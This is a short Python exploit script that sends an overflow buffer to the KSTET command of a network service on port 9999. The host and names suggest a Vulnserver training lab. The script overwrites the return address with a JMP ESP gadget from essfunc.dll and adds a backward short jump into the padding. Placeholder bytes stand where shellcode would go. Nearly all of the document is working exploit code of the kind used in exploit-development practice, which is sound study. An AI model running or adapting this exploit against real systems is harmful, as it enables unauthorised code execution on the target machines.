#!/usr/bin/python

import os
import socket
import sys

host = '192.168.100.118'
port = 9999

buffer =  'KSTET '
buffer += '\x41' * 70
buffer += '\xaf\x11\x50\x62' # 0x625011AF - Jmp ESP - essfunc.dll
buffer += '\xeb\xb4'         # jmp 0x00B7F9C2 to start of the A buffer
buffer += '\x43' * 500

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

s.recv(1024)
s.send(buffer)
s.close()

